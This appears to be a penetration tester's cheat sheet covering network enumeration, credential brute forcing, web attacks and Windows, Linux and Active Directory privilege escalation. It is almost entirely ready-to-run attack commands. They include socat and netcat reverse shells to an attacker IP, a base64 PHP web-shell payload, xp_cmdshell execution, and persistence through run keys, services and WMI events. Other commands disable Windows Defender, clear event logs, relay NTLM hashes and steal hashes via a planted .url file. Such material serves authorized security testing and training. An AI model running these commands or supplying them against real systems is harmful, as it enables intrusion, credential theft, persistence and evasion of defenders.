# **Protocols**

Most common services and their ports (all TCP unless stated otherwise):

| Port(s) | Service |
| :---: | :---: |
| `21` | FTP |
| `22` | SSH |
| `23` | Telnet |
| `25` | SMTP (mail) |
| `587` | secure SMTP |
| `53` (UDP) | DNS |
| `67` (UDP) and `68` (UDP) | DHCP |
| `69` (UDP) | TFTP |
| `80` | HTTP |
| `443` | HTTPS |
| `110` | POP3 (mail) |
| `111` | ONC RPC |
| `143` | IMAP (mail) |
| `161` (UDP) | SNMP |
| `139` and `445` | SMB |
| `1433` | MSSQL |
| `1978` | WiFi Mouse |
| `2049` | NFS |
| `3306` | MySQL |
| `3389` | Windows Remote Desktop (RDP) |
| `5900` | VNC |
| `5985` | WinRM HTTP |
| `5986` | WinRM HTTPS |

Most common Active Directory (AD) services and their ports:

| Port(s) | Service |
| :---: | :---: |
| `53` | DNS |
| `88` | Kerberos Authentication |
| `135` | WMI RPC |
| `138`, `139`, and `445` | SMB |
| `389` | LDAP |
| `636` | LDAPS |
| `5355` | LLMNR |
| `8530` and `8531` | WSUS |

**Indicators of Domain Controller:** ports 53, 88, 389 (LDAP), 636 (LDAPS)

* `%SYSTEMROOT%\NTDS\NTDS.dit` has all information and user password hashes

# **ARP Scan**

`arp-scan -l [range]`  
`netdiscover -r [range]`

# **Service Scan**

`autorecon [targets] -v`  
`nmap -p⁠- -T4 -sC -sV -vv [targets]`

# **FTP**

`wget -m ftp://[username]:[password]@[host]` ⇒ download all files  
`ftp [host]` OR `ftp [username]@[host]`  
Run `help` for a more comprehensive list of commands.

* `ls`  
* `binary` ⇒ transfer binary file  
* `ascii` ⇒ transfer text file  
* `put [file]` ⇒ upload  
* `get [file]` ⇒ download  
* `mget *` ⇒ get all files  
* `close`

# **SSH**

`ssh [domain]\\[username]@[host] -p [port]`  
`hydra -l [username] -P [wordlist] -s [port] ssh://[host]`

# **SMTP**

`nmap -p25, --script smtp-open-relay [host]`

`ismtp -h [host]:25 -e [wordlist] -l 3`  
`smtp-user-enum -M [mode] -U [wordlist] -t [host]`

* modes: `VRFY`, `EXPN`, `RCPT`  
* example wordlist: `/usr/share/metasploit-framework/data/wordlists/unix_users.txt`

`sendemail -s [host] -xu [username] -xp [password] -f [from] -t [to] -u [subject] -m [message] -a [attachment]`  
`swaks --server [host] -au [username] -ap [password] -f [from] -t [to] --h-Subject [subject] --body [message] --attach @[attachment] -n`

# **SNMP**

`hydra -P [wordlist] -v [host] snmp`  
`snmp-check -c [community] [ip]`

`snmpwalk -c [community] -v [version] [host] NET-SNMP-EXTEND-MIB::nsExtendOutputFull`  
`snmpwalk -c [community] -v [version` → `1` or `2c]` ⇒ entire MIB tree  
`snmpwalk -c [community] -v [version] [host] [identifier]` ⇒ specific MIB parameter

MIB Identifiers

* System Processes: 	`1.3.6.1.2.1.25.1.6.0`  
* Running Programs: 	`1.3.6.1.2.1.25.4.2.1.2`  
* Processes Paths: 	`1.3.6.1.2.1.25.4.2.1.4`  
* Storage Units: 	`1.3.6.1.2.1.25.2.3.1.4`  
* Software Names: 	`1.3.6.1.2.1.25.6.3.1.2`  
* User Accounts: 	`1.3.6.1.4.1.77.1.2.25`  
* TCP Local Ports: 	`1.3.6.1.2.1.6.13.1.3`

# **SMB**

`nbtscan -r [range]`  
`enum4linux -v -a [host]`  
`crackmapexec smb [host] -u [username] -p [password] --rid-brute`  
see [SMB Relay](#smb-relay)

**SMBMap**

* `smbmap -H [host]`   
  * `-r` ⇒ recursive  
  * `--depth [depth]` ⇒ traverse directory to specific depth (default 5\)  
  * `-u [username] -p [password]`  
  * `-x [command]` ⇒ execute command  
  * `-s [share]` ⇒ enumerate share  
  * `-d [domain]` ⇒ enumerate domain  
  * `--download [file]`  
  * `--upload [file]`

OR  
**SMBClient**  
`smbclient -N -L //[host]`

* `smbclient //[host]/[share]`  
  * `-L [host]` ⇒ list shares  
  * `-I [ip]`  
  * `-D [directory]`  
  * `-U [domain]/[username]%[password]`  
  * `-N` ⇒ don’t use password  
  * `-c [command]`  
* download interesting files with  
  * `smbclient //[host]/[share]` (optional: `-U [username]`)  
  * `get [filename]`  
  * `put [filename]`  
  * `exit`

	OR recursively download all with

* `prompt off`  
* `recurse on`  
* `mget *`

OR  
**SMBGet**

* `smbget -R smb://[host]/[disk]` ⇒ download all files

**Bruteforce:** `crackmapexec smb [host] -u [user/users/file] -p [password/passwords/file] --continue-on-success`

* `[-]` ⇒ invalid credentials  
* `[+]` ⇒ valid credentials  
* `(Pwn3d!)` ⇒ user is local admin

  ## **Windows**

Shares

* `SYSVOL` ⇒ AD stuff (GPOs, logon scripts) `C:\Windows\SYSVOL` on DC  
* `C` ⇒ `C:\`  
* `IPC` ⇒ enumeration (admin scripts, event logs, etc)

`dir \\[domain or ip]\[share] /user:[username] [password]`  
**Note:** `domain` ⇒ kerberos auth vs `ip` ⇒ NTLM auth  
`net use [drive letter]: \\[domain]\[share] /user:[username] [password] /persistent:yes`

# **LDAP**

`nmap --script=ldap* [host]`

`ldapdomaindump ldap://[host] -u '[domain]\[user]' -p [password] -o [dir]`  
`ldapsearch -x -H ldap://[host] -b base namingcontexts`  
`ldapsearch -x -H ldap://[host] -D '[domain]\[user]' -w [password] -b "DC=[subdomain],DC=[TLD]"`

# **Kerberos**

`kerbrute userenum --dc [DC] -d [domain] [userlist]`  
`kerbrute passwordspray --dc [DC] -d [domain] [userlist] [password]`  
`kerbrute bruteuser --dc [DC] -d [domain] [passlist] [user]`  
`kerbrute bruteforce --dc [DC] -d [domain] [credslist]`

* `credslist` contains `[user]:[pass]` on each line

# **RPC**

[Useful RPC commands](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration)  
`rpcclient -N -U "" [host]`  
`rpcclient -U [domain]/[user]%[password] [host]`

* `-N` ⇒ no password  
* `--pw-nt-hash` ⇒ supplied password is an nt hash

# **SQL**

**MySQL:** `mysql -h [host] -P [port] -u [username] -p'[password]'`  
**PostgreSQL:** `PGPASSWORD=[password] psql -h [host] -p [port] -U [username]`

**MSSQL**  
`impacket-mssqlclient [domain]/[username]:[password]@[host] -port [port] -windows-auth`

### Interesting Functions

`use master;`  
`EXEC sp_helprotect 'xp_cmdshell';`  
`EXEC sp_helprotect 'xp_regread';`  
`EXEC sp_helprotect 'xp_regwrite';`  
`EXEC sp_helprotect 'xp_dirtree';`  
`EXEC sp_helprotect 'xp_subdirs';`  
`EXEC sp_helprotect 'xp_fileexist';`

### Command Execution

`SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';`  
`EXEC sp_configure 'show advanced options', '1';`    
`RECONFIGURE WITH OVERRIDE;`  
`EXEC sp_configure 'xp_cmdshell', 1;`  
`RECONFIGURE;`  
`EXEC xp_cmdshell [command];`

### Impersonate

`SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';`  
`SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;`  
`EXECUTE AS login = '[user]'; [query];`  
`EXECUTE AS login = '[user]'; EXEC xp_cmdshell '[command]';`

### Over Link

`SELECT srvname, srvproduct, rpcout FROM master..sysservers;`  
`SELECT * FROM OPENQUERY("[target (srvname)]", '[query]');`  
`SELECT * FROM OPENQUERY("[target]", 'SELECT @@SERVERNAME; exec xp_cmdshell ''[command]''');`  
**Note:** When using xp\_cmdshell with OpenQuery, prepend a dummy query before it or else it won’t work.

# **NFS**

`rpcinfo -p [host]`  
`showmount -e [host]`  
`mount [host]:[share] /mnt/[dir]`  
`unmount /mnt/[dir]`

# **WinRM**

`crackmapexec winrm [hosts] -u [username] -p [password]`  
`evil-winrm -i [host] -u [user] -p [password]`  
`evil-winrm -i [host] -u [user] -H [hash]`

`KRB5CCNAME=[ticket].ccache`  
`evil-winrm -i [host] -r [domain] -u [user]`

# **RDP**

`xfreerdp /u:[domain]\\[username] /p:[password] /v:[host] +clipboard /drive:[Windows share name],[kali folder]`  
`xfreerdp /u:[domain]\\[username] /pth:[hash] /v:[host] +clipboard /drive:[Windows share name],[kali folder]`  
`rdesktop -d [domain] -u [username] -p [password] [host]`  
`hydra -l [username] -P [wordlist] -s [port] rdp://[host]`

# **VNC**

`vncviewer [host]:[port] -passwd [password file]`  
`hydra -s [port] -P [wordlist] -t 4 [host] vnc`

# **Web Pen Testing**

**Payloads:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)  
**Encoding/Decoding:** [CyberChef](https://gchq.github.io/CyberChef/)

# **Site Recon**

[NetCraft](https://sitereport.netcraft.com/)  
[Shodan](https://www.shodan.io)  
[Censys](https://search.censys.io)  
[Wappalyzer](https://www.wappalyzer.com)  
[BuiltWith](https://builtwith.com)

# **Subdomains**

`theharvester -d [domain] -b [search engine]`  
`amass enum -passive -src -d [domain]`  
`amass enum -active -d [domain]`

`cat [file with domains] | httprobe`

# **GoBuster**

`gobuster dns -d [domain] -w [wordlist] -t [num threads]`

`gobuster dir -u [target URL] -x [file extensions] -w [wordlist]`  
`gobuster dir -u [target URL] -x [file extensions] -w [wordlist] -U [auth username] -P [auth password] -s [invalid status codes] -t [num threads]`

* `-k` ⇒ don’t check ssl cert

# **ffuf**

**Directories:**	`ffuf -w [wordlist] -u http://[URL]/FUZZ`  
**Files:**		`ffuf -w [wordlist] -u http://[URL]/FUZZ -e .aspx,.html,.php,.txt,.pdf -recursion`  
**Subdomains:**	`ffuf -w [wordlist] -u http://[URL] -H "Host: FUZZ.[domain]"`  
**POST Data:**	`ffuf -w [wordlist] -X POST -d "[username=admin\&password=FUZZ]" -u http://[URL]`  
**From File:**	`ffuf -request [req.txt] -request-proto http -w [wordlist]`  
**Creds:**		`ffuf -request [req.txt] -request-proto http -mode [pitchfork/clusterbomb] -w [usernames.txt]:[HFUZZ] -w [passwords.txt]:[WFUZZ]`

**“Good” (Match)**

* `-mc` ⇒ status code  
* `-ms` ⇒ response size  
* `-mw` ⇒ number of words  
* `-ml` ⇒ number of lines  
* `-mr` ⇒ regex pattern

**“Bad” (Filter)**

* `-fc` ⇒ status code  
* `-fs` ⇒ response size  
* `-fw` ⇒ number of words  
* `-fl` ⇒ number of lines  
* `-fr` ⇒ regex pattern

# **BurpSuite**

### BurpSuite Tabs

* **Target** ⇒ site map and spidering  
* **Proxy** ⇒ intercept traffic  
* **Intruder** ⇒ bruteforce attacks (think automated repeater)  
* **Repeater** ⇒ send same request multiple times with different parameters  
* **Sequencer** ⇒ analyse quality of randomness in session tokens  
* **Decoder** ⇒ encode/decode text as hex, UTF, etc.  
* **Extender** ⇒ add plugins

  ### Intruder Attack Types

Single Payload Set

* **Sniper:** each payload goes to each payload position, in turn  
* **Battering Ram:** same payload in all positions

Multiple Payload Sets

* **Pitchfork:** same payload position from multiple sets at a time (credential stuffing)  
* **Cluster Bomb:** all payload combinations

  ### Scoping Target

* right-click → Add to scope  
* click filter bar on top → under Filter by request type, check Show only in-scope items

# **SQLmap**

* `sqlmap -u [base URL] --crawl=1` (check all pages for injectability)  
* `sqlmap -u [website URL] --current-user` (gets current user)  
* `sqlmap -u [website URL] --dbs` (gets databases)  
* `sqlmap -u [website URL] --current-database` (gets current database)  
* `sqlmap -u [website URL] --dump --threads=[number]` (gets all data from database)  
* `sqlmap -u [website URL] -D [database] --tables` (gets tables)  
* `sqlmap -u [website URL] -D [database] -T [table] --columns` (gets columns)  
* `sqlmap -u [website URL] -D [database] -T [table] -C [columns` → can be multiple separated by `,] --dump`  
* `sqlmap -u [website URL] --os-shell` (attempts to get shell on target)

# **Local File Inclusion (LFI)**

### Directories to try

`/etc/passwd`  
`/var/log/apache2/access.log`  
`C:\Windows\System32\drivers\etc\hosts`

### PHP wrappers

`php://filter/resource=[file].php` ⇒ display contents of PHP file  
`php://filter/convert.base64-encode/resource=[file].php`

`data://text/plain,<?php[code]?>` ⇒ run PHP code  
`data://text/plain;base64,[base64]` ⇒ run base 64 encoded PHP code  
`data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls`

# **WordPress**

`wpscan --url http://[host] -e vp,vt --detection-mode aggressive -v --api-token [token]`  
get token from [https://wpscan.com/profile](https://wpscan.com/profile)

# **Git**

`git-dumper http://[url] [output dir]`  
`git status`  
`git log`  
`git show [commit hash]`  
`git reset --hard [commit hash]`

# **Linux/Kali**

I will think of a better title for this section, I swear.

[Linux Terminal Cheat Sheet](https://docs.google.com/document/d/1vJxoHrjW607NJDLC1Zln1llrEIqrS6Ea3j9ihJTdblg/)  
[Linux Printing Tricks](https://github.com/RedefiningReality/Linux-Defence-Materials/blob/main/Linux%20Terminal/Printing%20Tricks.md)

[Reverse Shells](https://www.revshells.com)  
``socat file:`tty`,raw,echo=0 tcp-listen:[port]``  
`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[ip]:[port]`  
`socat.exe exec:'cmd.exe',pipes TCP4:[ip]:[port]`

# **Serving Files**

**HTTP:** `python3 -m http.server [port] --directory [directory]`  
**SMB:** `impacket-smbserver [share] [directory] -port [port] -username [username] -password [password] -smb2support`  
**FTP:** `python3 -m pyftpdlib -d [directory] -p [port] -u [username] -P [password]`

* `add -w for write permission`

# **Beautify Shell**

* `python -c 'import pty; pty.spawn("/bin/bash")'` OR `script -qc /bin/bash /dev/null` OR `perl -e 'exec "/bin/sh";'`  
* `^Z` (`Ctrl+Z`)  
* `stty -a`  
  * remember rows and columns  
* `stty raw -echo`  
* `fg`  
* `fg` (yes, you have to type it twice → this is not a typo)  
* `export term=xterm`  
* `stty rows [rows] columns [columns]`

# **Persistence**

### Create New Service

edit `/etc/systemd/system/[service].service`

| `[Unit] Description=[description]  [Service] Type=simple Restart=always ExecStart=[executable]  [Install] WantedBy=multi-user.target` |
| :---- |

`systemctl daemon reload`  
`systemctl enable [service]`

### Create New Cron Job

`crontab -e`  
`[minute] [hour] [day of month] [month] [day of week] [command]`

# **Windows**

[Windows Terminal Cheat Sheet](https://docs.google.com/document/d/1CGgADAOZQuMXAyzXVeXRNhQ_PPBYliMXCy-4RNE0UMw/)  
[PowerView Cheat Sheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

# **Lateral Movement**

## **Remote Enumeration**

`net session \\[host]`  
`reg query \\[host]\[key] ...`

`net view \\[host]`  
`dir \\[host]\[share]`  
`net use * \\[host]\[share] /user:[domain]\[username] [password]`

`tasklist /s [host] ...`

## **Movement**

`psexec \\[host] -u [username] -p [password] -i cmd`  
`winrs -u:[username] -p:[password] -r:[host] cmd`

### Switch Users

`runas /user:[domain]\[username] cmd`

* `/netonly` to keep same user access on local machine (only login for network connections)  
* `/savecred` to get creds from or save creds to Windows Credential Manager

`runascs [username] [password] cmd`

* `-d [domain]`  
* `-r [host]:[port]` ⇒ reverse shell  
* `-b` ⇒ bypass UAC

  ### Create New Process (WMI)

`wmic /node:[ip] process call create [executable]`  
`Invoke-CimMethod -ClassName Win32_Process -MethodName Create -CimSession (New-CimSession -ComputerName "[ip]") -Arguments @{CommandLine="[executable]"}`

### Create New Service

`sc \\[host] create [service] binPath= "[executable]" start= auto displayname= "[name]"`  
`sc \\[host] description [service] "[description]"`  
`sc \\[host] [start/stop/delete] [service]`

### Modify Existing Service

`sc \\[host] qc vss` → ✓ service runs as LocalSystem  
`sc \\[host] query vss` → ✓ service is currently not running  
`sc \\[host] config vss binpath= "[executable]"`  
`sc \\[host] [start/stop] vss`

### Create Scheduled Task

`schtasks /s [host] /ru [user] /create /f /tn [name] /tr [command] /sc ONCE /sd 01/01/1970 /st 00:00`  
`schtasks /s [host] /run /tn [name]`

# **Persistence**

## **User Level**

**Note:** To find more autorun options, check out [Autoruns from SysInternals](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns). This includes startup directories and registry keys.

### Startup Directories

* `%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` ⇒ executed when current user logs in  
* `%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup` ⇒ executed when any user logs in

  ### Registry Run Key

**Runs When Current User Logs In**  
upload exe file to somewhere in `%USERPROFILE%\AppData\Roaming`  
`reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v [name] /t REG_SZ /f /d "[path to exe]"`

**Runs When Any User Logs In**  
upload exe file to somewhere in `C:\ProgramData`  
`reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v [name] /t REG_SZ /f /d "[path to exe]"`

### Scheduled Task

upload exe file to somewhere in `%USERPROFILE%\AppData\Roaming`  
`schtasks /create /f /tn [name] /tr [path to exe] /sc ONLOGON`  
`schtasks /create /f /tn [name] /tr [path to exe] /sc DAILY /st [hh:mm]`

* check with `schtasks /query /tn [name] /fo list /v`  
* run manually with `schtasks /run /tn [name]`

  ## **System Level**

[DLL Hijacking](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking)

### Startup Service

upload file to somewhere in `%SystemRoot%\System32`  
**Note:** either upload a *service* executable or use cmd /c start /b \[executable\] as your binpath  
`sc create [service] binPath= "[executable]" start= auto displayname= "[name]"`  
`sc description [service] "[description]"`  
`sc [start/stop/delete] [service]`

### Scheduled Task

upload exe file to somewhere in `%SystemRoot%\System32`  
`schtasks /create /f /tn [name] /ru system /tr [path to exe] /sc ONSTART`  
`schtasks /create /f /tn [name] /ru system /tr [path to exe] /sc DAILY /st [hh:mm]`

* check with `schtasks /query /tn [name] /fo list /v`  
* run manually with `schtasks /run /tn [name]`

  ### WMI Event

upload exe file to somewhere in %SystemRoot%\\System32  
`wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="[name]", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"`

`wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="[name]", ExecutablePath="[executable]",CommandLineTemplate="[executable]"`

`wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"[name]\"", Consumer="CommandLineEventConsumer.Name=\"[name]\""`

# **Recursive File Listing**

`dir /s /a \\[host]\[path] > [logfile]`  
`forfiles /s /c "cmd /c echo @path" /p [path] > [logfile]`

`makecab [logfile] [compressed].zip`  
`extract [compressed].zip [logfile]`

# **Enable Command Prompt**

`reg add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 0 /f`

# **Enable Remote Desktop**

`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`

`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f`

`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`

`reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`

`netsh advfirewall firewall set rule group="remote desktop" new enable=Yes`  
	OR  
`netsh advfirewall set allprofiles state off`

`sc start TermService`

# **User Creation**

### Local

`net user [username] [password] /add`  
`net localgroup Administrators [username] /add`  
`net localgroup "Remote Management Users" [username] /add`  
`net localgroup "Remote Desktop Users" [username] /add`

### Domain

`net user [username] [password] /add /domain`  
`net group "Domain Admins" [username] /add /domain`

# **Insecure Guest Authentication**

### Enable

`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v AllowInsecureGuestAuth /t REG_DWORD /d 1 /f`  
`shutdown /r /f /t 0`

### Disable

`reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v AllowInsecureGuestAuth /f`  
`shutdown /r /f /t 0`

# **Privilege Escalation**

[https://gitlab.com/exploit-database/exploitdb-bin-sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits)

# **Windows**

## **Checklist**

[https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation)

1. access tokens  
2. Administrators group → [fodhelper UAC bypass](https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1)  
3. PowerShell history  
4. service permissions  
5. [DLL hijacking](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking)  
6. recent folders/files  
7. interesting folders/files: C:\\, C:\\Users  
8. passwords in registry  
9. stored WiFi passwords  
10. kernel version

[LOLBAS](https://lolbas-project.github.io)

### Check AppLocker/Antivirus

`(Get-ApplockerPolicy -Effective).RuleCollections`

`Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct -ErrorAction Stop`  
`Get-MpComputerStatus`  
`sc query windefend`

### Disable Windows Defender

`sc config WinDefend start= disabled`  
`Set-MpPreference -DisableRealtimeMonitoring $true`  
`"%ProgramFiles%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All`

### Clear Event Log

`Clear-EventLog -LogName Application, Security`

### Access Tokens

[HackTricks Token Abuse](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)

SeImpersonatePrivilege → Potato Attacks  
[SweetPotato](https://github.com/CCob/SweetPotato), [GodPotato](https://github.com/BeichenDream/GodPotato)  
`SweetPotato.exe -p nc.exe -a "-nv [ip] [port] -e cmd" &`  
`GodPotato.exe -cmd "nc -nv [ip] [port] -e cmd" &`

`GodPotato.exe -cmd "net user [username] [password] /add"`  
`GodPotato.exe -cmd "net localgroup Administrators [username] /add"`  
`runascs [username] [password] cmd -b -r [attacker ip]:[port]`

SeRestorePrivilege → [SeRestoreAbuse](https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe)

### PowerShell History

`Get-History`  
`(Get-PSReadlineOption).HistorySavePath`

* `type [path]`

  ### Service Permissions

**Recommended:** use a script like [PrivescCheck.ps1](https://github.com/itm4n/PrivescCheck)  
`sc qc [service]`  
`sc sdshow [service]` ⇒ list service permissions  
`icacls [path]` ⇒ list folder/file permissions (eg. unquoted service path)  
`sc config [service] binpath= "[executable]"` ⇒ reconfigure service

* `[executable]` can either be a *service* executable or `cmd /c start /b [executable]`

`sc [start/stop] [service]`

### DLL Hijacking

[Generate malicious DLL](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking#creating-and-compiling-dlls)  
`msfvenom [options] -f dll -o [file].dll`

### Recent Folders/Files

`dir %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Recent`

### Interesting Folders/Files

`Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.pdf,*.kdbx,*.exe -Recurse -ErrorAction SilentlyContinue`

### Passwords in Registry

`reg query HKLM /f password /t REG_SZ /s`

### Stored WiFi Passwords

`netsh wlan show profiles`  
`netsh wlan export profile folder=. key=clear`

### Kernel Exploits

[https://github.com/51x/WHP](https://github.com/51x/WHP)  
[https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

## **Guides**

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)  
* [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)  
* [Sushant 747’s Guide](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)  
* [Fuzzy Security Guide](https://www.fuzzysecurity.com/tutorials/16.html)  
* [Absoloom's Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)

  ## **Scripts**

  ### Executables

* [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)  
* [Seatbelt](https://github.com/GhostPack/Seatbelt) (compile)  
* [SharpUp](https://github.com/GhostPack/SharpUp) (compile)  
* [Watson](https://github.com/rasta-mouse/Watson) (compile)

  ### PowerShell

* [PrivescCheck](https://github.com/itm4n/PrivescCheck)  
  * `Invoke-PrivescCheck -Extended`  
  * `Invoke-PrivescCheck -Extended -Report "PrivescCheck_$($env:COMPUTERNAME)" -Format TXT,CSV,HTML,XML`  
* [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) (deprecated)  
  * `Invoke-AllChecks`  
* [Jaws](https://github.com/411Hall/JAWS)  
* [Sherlock](https://github.com/rasta-mouse/Sherlock) (deprecated)

  ### Other

* [windows-exploit-suggester](https://github.com/bitsadmin/wesng) ⇒ get kernel exploits from sysinfo  
  * `wes --update`  
  * `wes systeminfo.txt -c -e -i "Elevation"`  
* Meterpreter `run post/multi/recon/local_exploit_suggester`  
* Meterpreter `getsystem`

# **Linux**

## **Checklist**

[https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist)

1. SUID\*  
2. sudo\*  
3. processes running as root  
4. internal services → [port redirection](#ssh)  
5. cron jobs  
6. interesting folders/files: /, /opt, /home  
7. kernel version

\*check [GTFObins](https://gtfobins.github.io)

### SUID

`find / ⁠-perm -u=s -user root 2>/dev/null`  
`find / -perm -g=s -group root 2>/dev/null`  
`getcap -r / 2>/dev/null`

### Sudo

`sudo -l`

### Processes

`ps fauxww`  
`ps -ewwo pid,user,cmd --forest`

### Services

`netstat/ss -antup`  
`netstat/ss -plunt`

### Cron Jobs

`cat /etc/crontab`  
`ls /var/spool/cron`  
`ls /etc/cron.*`

## **Guides**

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)  
* [HackTricks](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist)  
* [Sushant 747’s Guide](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html)  
* [g0tmi1k Blog](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

  ## **Scripts**

* [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)  
* [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)  
* [LinEnum](https://github.com/rebootuser/LinEnum)  
* [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)  
* [linux-exploit-suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)  
* Meterpreter `run post/multi/recon/local_exploit_suggester`

`int main {`  
	`setuid(0);`  
	`setgid(0);`  
	`system("/bin/bash");`  
`}`

`cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p`

# **Active Directory (AD)**

[https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest\_ad\_dark\_2022\_11.svg](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg)  
**Sync clock:** `timedatectl set-ntp 0 && ntpdate -u [domain]`

# **LLMNR/NBT-NS Poisoning**

* `responder -I [interface] -dwP` (optional `-v`)  
  * Remember you can get interface with ip a  
* `hashcat -m 5600 [file containing obtained hash] [wordlist]`

# **SMB Relay** {#smb-relay}

**Requirements:** SMB signing disabled and relayed credentials are admin on the target machine  
**Note:** You can’t relay back to the same machine.

* discover hosts with SMB signing disabled:  
  * Nessus scan will tell you  
    OR  
  * `nmap --script smb2-security-mode -p 445 [network]`  
    * Check for `enabled and not required`

    OR

  * `crackmapexec smb [network]`  
    * Check for `signing:False`  
  * Add hosts to targets file (separate lines)  
    OR  
  * `crackmapexec smb [network] --gen-relay-list [targets file]`  
* edit `/etc/responder/Responder.conf`  
  * Change `SMB =` and `HTTP =` from `On` to `Off`  
* `responder -I [interface] -dwP` (optional `-v`)  
  AND  
* `impacket-ntlmrelayx -tf [targets file] -smb2support`  
  * `-i` ⇒ interactive smb shell  
    * Wait for connection – note “started interactive” port  
    * nc \-nv 127.0.0.1 \[port\]  
  * `-e [malicious].exe` ⇒ execute file  
    * Can be msfvenom payload for example  
  * `-c "[command]"` ⇒ execute command  
  * `-l [directory]` ⇒ store loot in directory (see IPv6 attacks) → useful if credentials are non-admin

# **IPv6 Attack**

[https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)

* Install MITM6 → download from [GitHub](https://github.com/dirkjanm/mitm6), `cd` to directory, and `pip3 install .`  
  * If it fails, try normal `pip`  
* `mitm6 -d [domain]`  
  AND  
* `impacket-ntlmrelayx -6 -t ldaps://[DC IP] -wh bogus.[domain] -l [directory]`  
* `cd` to directory and `firefox [file]` to see info  
* look for username and password for newly created user in ntlmrelayx prompt

# **URL File Attack**

**Note:** must have access to a writable SMB share

* upload file that starts with `@` or `~` symbol and ends in `.url`: `@test.url`  
  * (`@` or `~`) ensures it shows up at top when user opens share  
  * File contents:

`[InternetShortcut]`  
`URL=blah`  
`WorkingDirectory=blah`  
`IconFile=\\[attacker ip]\%USERNAME%.icon`  
`IconIndex=1`

* `responder -I [interface] -v`

[https://github.com/Greenwolf/ntlm\_theft](https://github.com/Greenwolf/ntlm_theft)  
`ntlm_theft -s [attacker ip] -f [name] -g [all/url]`

`hashcat -m 5600 [hashes] [wordlist]`

# **BloodHound**

[https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html)

### Collection

* `SharpHound.exe -c [method] -d [domain] --exclude-dcs --zipfilename sharp.zip`  
  * `bloodhound-python -c [method] -d [domain] -u [username] -p [password] --hashes [hash] -ns [DC] --zip -v`  
